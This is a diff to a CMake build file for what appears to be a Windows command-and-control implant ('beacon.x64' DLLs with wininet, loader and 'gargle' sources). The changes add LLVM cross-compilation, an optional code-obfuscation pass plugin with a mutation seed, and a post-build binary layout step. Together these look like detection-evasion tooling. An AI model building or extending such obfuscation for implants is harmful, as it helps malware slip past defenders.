@@ -1,12 +1,27 @@
 # Beacon user-mode product — standard CMake project.
-# cmake -S . -B build -A x64
-# cmake --build build --config Release
+#
+# MSVC (default):
+#   cmake -S . -B build -A x64
+#   cmake --build build --config Release
+#
+# LLVM clang-cl + xwin (optional):
+#   cmake -S . -B build-llvm -G Ninja --toolchain cmake/toolchain-clang-cl-xwin.cmake \
+#     -DCLANG_CL=... -DLLD_LINK=... -DXWIN_DIR=... -DCMAKE_BUILD_TYPE=Release \
+#     [-DBEACON_OBF_PLUGIN=/path/obfpasses.so]
+#   cmake --build build-llvm
 cmake_minimum_required(VERSION 3.20)
 set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
 project(beacon LANGUAGES C CXX)
 
+option(BEACON_LLVM "clang-cl + xwin LLVM line (set by the xwin toolchain)" OFF)
+if(CMAKE_CXX_COMPILER_ID STREQUAL "Clang" AND CMAKE_CXX_COMPILER_FRONTEND_VARIANT STREQUAL "MSVC")
+  set(BEACON_LLVM ON)
+endif()
+
 if(NOT WIN32)
-  message(FATAL_ERROR "This project targets Windows (MSVC or clang-cl).")
+  message(FATAL_ERROR
+    "Target is Windows. For LLVM cross from Linux, pass "
+    "--toolchain cmake/toolchain-clang-cl-xwin.cmake")
 endif()
 
 set(CMAKE_CXX_STANDARD 17)
@@ -68,6 +83,36 @@ set(BEACON_LIB_DIR "${CMAKE_SOURCE_DIR}/lib" CACHE PATH
   "Directory with tomcrypt.x64.lib / tommath.x64.lib (tests may override)")
 set(BEACON_TEST_EXTRA_DEFS "" CACHE STRING
   "Extra preprocessor defs for beacon_tests (e.g. BEACON_TEST_ENABLE_KEYGEN)")
+set(XWIN_DIR "${XWIN_DIR}" CACHE PATH "xwin splat (LLVM line)")
+set(BEACON_OBF_PLUGIN "" CACHE FILEPATH "LLVM -fpass-plugin module (host .so/.dll)")
+set(BEACON_OBF_SEED "1337" CACHE STRING "OBF_SEED for the mutation pass")
+set(LLD_LINK "${LLD_LINK}" CACHE FILEPATH "lld-link (LLVM line)")
+
+if(BEACON_LLVM)
+  find_package(Python3 REQUIRED COMPONENTS Interpreter)
+  if(NOT LLD_LINK)
+    if(CMAKE_LINKER)
+      set(LLD_LINK "${CMAKE_LINKER}")
+    else()
+      set(LLD_LINK "lld-link")
+    endif()
+  endif()
+  set(_layout_stub "${CMAKE_BINARY_DIR}/layout_stub/layout.h")
+  file(MAKE_DIRECTORY "${CMAKE_BINARY_DIR}/layout_stub")
+  file(WRITE "${_layout_stub}"
+"#pragma once
+#define BW_LAYOUT_SOI        0x400000ULL
+#define BW_LAYOUT_REG_MAX    16
+static const unsigned long long bw_layout_reg[BW_LAYOUT_REG_MAX][2] = {
+    {0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},
+    {0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},
+    {0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},
+    {0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},{0ULL, 0ULL},
+};
+static const unsigned long long bw_layout_reg_n = 0ULL;
+")
+  message(STATUS "BEACON_LLVM=ON cc=${CMAKE_CXX_COMPILER} link=${LLD_LINK} xwin=${XWIN_DIR}")
+endif()
 
 set(BEACON_TOMCRYPT "${CMAKE_SOURCE_DIR}/lib/tomcrypt.x64.lib")
 set(BEACON_TOMMATH  "${CMAKE_SOURCE_DIR}/lib/tommath.x64.lib")
@@ -81,22 +126,50 @@ if(NOT EXISTS "${BEACON_TEST_TOMCRYPT}" OR NOT EXISTS "${BEACON_TEST_TOMMATH}")
 endif()
 
 function(add_beacon_dll target_name output_name sources extra_defs)
-  add_library(${target_name} SHARED ${${sources}})
-  target_include_directories(${target_name} PRIVATE
+  if(BEACON_LLVM)
+    set(_layout_dir "${CMAKE_BINARY_DIR}/layout/${target_name}")
+    file(MAKE_DIRECTORY "${_layout_dir}")
+    if(NOT EXISTS "${_layout_dir}/layout.h")
+      file(COPY "${CMAKE_BINARY_DIR}/layout_stub/layout.h" DESTINATION "${_layout_dir}")
+    endif()
+    add_library(${target_name}_objs OBJECT ${${sources}})
+    set(_cc_tgt ${target_name}_objs)
+    add_library(${target_name} SHARED $<TARGET_OBJECTS:${target_name}_objs>)
+  else()
+    add_library(${target_name} SHARED ${${sources}})
+    set(_cc_tgt ${target_name})
+  endif()
+
+  target_include_directories(${_cc_tgt} PRIVATE
     "${CMAKE_SOURCE_DIR}/src"
     "${CMAKE_SOURCE_DIR}/tomcrypt-headers")
-  target_compile_definitions(${target_name} PRIVATE
+  if(BEACON_LLVM)
+    target_include_directories(${_cc_tgt} PRIVATE "${_layout_dir}")
+    target_compile_definitions(${_cc_tgt} PRIVATE BW_LLVM_LAYOUT)
+  endif()
+  target_compile_definitions(${_cc_tgt} PRIVATE
     ${BEACON_COMMON_DEFS}
     ${extra_defs})
-  target_compile_options(${target_name} PRIVATE
+  target_compile_options(${_cc_tgt} PRIVATE
     /W3 /O1 /Ob1 /Os /Oi /GF /Gy /GS- /nologo
     $<$<COMPILE_LANGUAGE:CXX>:/GR- /std:c++17>)
+  if(BEACON_OBF_PLUGIN)
+    target_compile_options(${_cc_tgt} PRIVATE
+      "SHELL:/clang:-fpass-plugin=${BEACON_OBF_PLUGIN}")
+  endif()
+
   target_link_directories(${target_name} PRIVATE "${CMAKE_SOURCE_DIR}")
+  if(BEACON_LLVM AND XWIN_DIR)
+    target_link_directories(${target_name} PRIVATE
+      "${XWIN_DIR}/crt/lib/x86_64"
+      "${XWIN_DIR}/sdk/lib/um/x86_64"
+      "${XWIN_DIR}/sdk/lib/ucrt/x86_64")
+  endif()
   target_link_libraries(${target_name} PRIVATE
     ${BEACON_SYS_LIBS}
     "${BEACON_TOMCRYPT}"
     "${BEACON_TOMMATH}")
-  target_link_options(${target_name} PRIVATE
+  set(_link_opts
     /NOLOGO
     /MACHINE:X64
     /SUBSYSTEM:WINDOWS
@@ -104,11 +177,90 @@ function(add_beacon_dll target_name output_name sources extra_defs)
     /OPT:ICF
     /INCREMENTAL:NO
     /MAP:${BEACON_OUT}/${output_name}.map)
+  if(BEACON_LLVM)
+    list(APPEND _link_opts /Brepro)
+  endif()
+  target_link_options(${target_name} PRIVATE ${_link_opts})
   set_target_properties(${target_name} PROPERTIES
     OUTPUT_NAME "${output_name}"
     PREFIX ""
     SUFFIX ".dll"
     LINKER_LANGUAGE CXX)
+
+  if(BEACON_LLVM)
+    set(_gargle "")
+    foreach(_s ${${sources}})
+      if(_s MATCHES "gargle")
+        list(APPEND _gargle "${CMAKE_SOURCE_DIR}/${_s}")
+      endif()
+    endforeach()
+    set(_cflags_file "${_layout_dir}/cflags.txt")
+    set(_lflags_file "${_layout_dir}/lflags.txt")
+    set(_cflags
+      /nologo /c /W3 /O1 /Ob1 /Os /Oi /GF /Gy /GS- /GR- /std:c++17 /MT
+      /I${CMAKE_SOURCE_DIR}/src
+      /I${CMAKE_SOURCE_DIR}/tomcrypt-headers
+      /I${_layout_dir}
+      /DBW_LLVM_LAYOUT)
+    foreach(_d ${BEACON_COMMON_DEFS})
+      list(APPEND _cflags "/D${_d}")
+    endforeach()
+    foreach(_d ${extra_defs})
+      if(_d)
+        list(APPEND _cflags "/D${_d}")
+      endif()
+    endforeach()
+    if(XWIN_DIR)
+      list(APPEND _cflags
+        "/imsvc${XWIN_DIR}/crt/include"
+        "/imsvc${XWIN_DIR}/sdk/include/ucrt"
+        "/imsvc${XWIN_DIR}/sdk/include/um"
+        "/imsvc${XWIN_DIR}/sdk/include/shared")
+    endif()
+    if(BEACON_OBF_PLUGIN)
+      list(APPEND _cflags "/clang:-fpass-plugin=${BEACON_OBF_PLUGIN}")
+    endif()
+    string(REPLACE ";" "\n" _cflags_txt "${_cflags}")
+    file(WRITE "${_cflags_file}" "${_cflags_txt}\n")
+
+    set(_lflags /NOLOGO /DLL /MACHINE:X64 /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /INCREMENTAL:NO /Brepro)
+    if(XWIN_DIR)
+      list(APPEND _lflags
+        "/libpath:${XWIN_DIR}/crt/lib/x86_64"
+        "/libpath:${XWIN_DIR}/sdk/lib/um/x86_64"
+        "/libpath:${XWIN_DIR}/sdk/lib/ucrt/x86_64")
+    endif()
+    list(APPEND _lflags "/libpath:${CMAKE_SOURCE_DIR}/lib" "/libpath:${CMAKE_SOURCE_DIR}")
+    foreach(_l ${BEACON_SYS_LIBS})
+      list(APPEND _lflags "${_l}.lib")
+    endforeach()
+    list(APPEND _lflags "${BEACON_TOMCRYPT}" "${BEACON_TOMMATH}")
+    string(REPLACE ";" "\n" _lflags_txt "${_lflags}")
+    file(WRITE "${_lflags_file}" "${_lflags_txt}\n")
+
+    file(GENERATE OUTPUT "${_layout_dir}/objs.txt"
+      CONTENT "$<JOIN:$<TARGET_OBJECTS:${target_name}_objs>,\n>\n")
+
+    set(_gargle_args "")
+    foreach(_g ${_gargle})
+      list(APPEND _gargle_args --gargle "${_g}")
+    endforeach()
+    add_custom_command(TARGET ${target_name} POST_BUILD
+      COMMAND ${CMAKE_COMMAND} -E env "OBF_SEED=${BEACON_OBF_SEED}"
+              ${Python3_EXECUTABLE} "${CMAKE_SOURCE_DIR}/tools/llvm/apply_layout.py"
+              --dll "$<TARGET_FILE:${target_name}>"
+              --layout "${_layout_dir}/layout.h"
+              --cc "${CMAKE_CXX_COMPILER}"
+              --link "${LLD_LINK}"
+              --out "$<TARGET_FILE:${target_name}>"
+              --map "${BEACON_OUT}/${output_name}.map"
+              --objs-file "${_layout_dir}/objs.txt"
+              --cflags-file "${_cflags_file}"
+              --lflags-file "${_lflags_file}"
+              ${_gargle_args}
+      COMMENT "LLVM layout pass-2 ${target_name}"
+      VERBATIM)
+  endif()
 endfunction()
 
 add_beacon_dll(beacon_wininet beacon.x64 BEACON_WININET_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3")
@@ -204,6 +356,8 @@ set_target_properties(host_template PROPERTIES
   OUTPUT_NAME host_template_x64)
 
 enable_testing()
-add_test(NAME host_unit COMMAND beacon_tests)
-add_test(NAME load_smoke_wininet COMMAND load_smoke "$<TARGET_FILE:beacon_wininet>")
-set_tests_properties(load_smoke_wininet PROPERTIES DEPENDS host_unit)
+if(NOT CMAKE_CROSSCOMPILING)
+  add_test(NAME host_unit COMMAND beacon_tests)
+  add_test(NAME load_smoke_wininet COMMAND load_smoke "$<TARGET_FILE:beacon_wininet>")
+  set_tests_properties(load_smoke_wininet PROPERTIES DEPENDS host_unit)
+endif()
